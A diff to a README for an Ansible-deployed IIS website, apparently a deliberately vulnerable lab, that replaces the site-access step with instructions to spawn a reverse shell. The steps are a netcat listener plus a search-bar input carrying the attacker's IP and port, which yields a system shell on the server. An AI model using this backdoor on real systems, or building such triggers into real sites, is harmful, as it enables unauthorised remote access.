@@ -88,8 +88,17 @@ To set up the IIS server and deploy the website, execute the following command:
 ansible-playbook -i inventory.yml iis_setup.yml
 ```
 
-## 4. Access the Website
+## 4. Spawn a Reverse Shell
+To spawn a reverse shell, follow these steps:
 
-Once the deployment is complete, open your browser and navigate to: http://your_server_ip/
+1. **Set Up a Listener**: On your machine, start a listener using a tool like `netcat`. For example:
+   ```bash
+   nc -lvnp [PORT]
+   ```
+2. **Trigger the Reverse Shell**: Once the deployment is complete, open your browser and navigate to: http://your_server_ip/. On the deployed website, locate the search bar. Enter the following command:
+    ```html
+    search [YOUR_IP] [PORT]
+    ```
+    Replace `[YOUR_IP]` with your machine's IP address and `[PORT]` with the port you are listening on (e.g., `8080`).
 
-This will display the deployed website.
+3. **Gain Access**: Once the command is executed, a system shell will be spawned, and you will have access to the target machine.
